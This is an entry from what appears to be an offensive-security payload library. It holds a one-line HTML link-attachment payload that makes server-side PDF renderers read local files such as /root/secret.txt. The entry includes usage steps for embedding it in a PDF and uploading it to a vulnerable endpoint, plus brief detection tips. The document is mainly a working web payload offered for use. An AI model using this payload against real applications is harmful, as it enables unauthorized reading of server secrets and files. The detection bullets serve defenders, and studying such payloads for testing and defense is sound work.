---
id: 08779977-85a5-48f8-a9d5-eaea9f61f68b
type: code
name: HTML-Link-Attachment-for-SSRF-Secret-File-Read
language: html
verified: true
created_at: '2023-04-06T03:56:38.080469+00:00'
updated_at: '2023-04-10T20:24:10.903477+00:00'
tags:
  - ssrf
  - pdf-payload
  - file-read
platforms:
  - Web
validated: true
---

# HTML-Link-Attachment-for-SSRF-Secret-File-Read

## Code

```html
<link rel=attachment href="file:///root/secret.txt">
```

## Description

This HTML snippet exploits SSRF in PDF processing by using a link attachment to force the server to fetch and potentially render a local file, such as /root/secret.txt. When embedded in a PDF and uploaded to a vulnerable application, the server's renderer may follow the file:// URI, exposing the file contents in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| href | Path to the target internal file | file:///root/secret.txt |

## Usage

Embed this code into a PDF using tools like Adobe Acrobat or PDFtk, then upload to an SSRF-vulnerable endpoint that processes PDFs server-side. Useful in scenarios where the application fetches attachments during rendering. See [[procedures/Exploit-SSRF-via-PDF-to-Read-Sensitive-Files]] for integration.

## Detection

- Monitor PDF uploads for embedded file:// links in content or metadata.
- Log renderer access to local files outside expected paths.
- WAF rules to block attachment fetches in PDF processing.
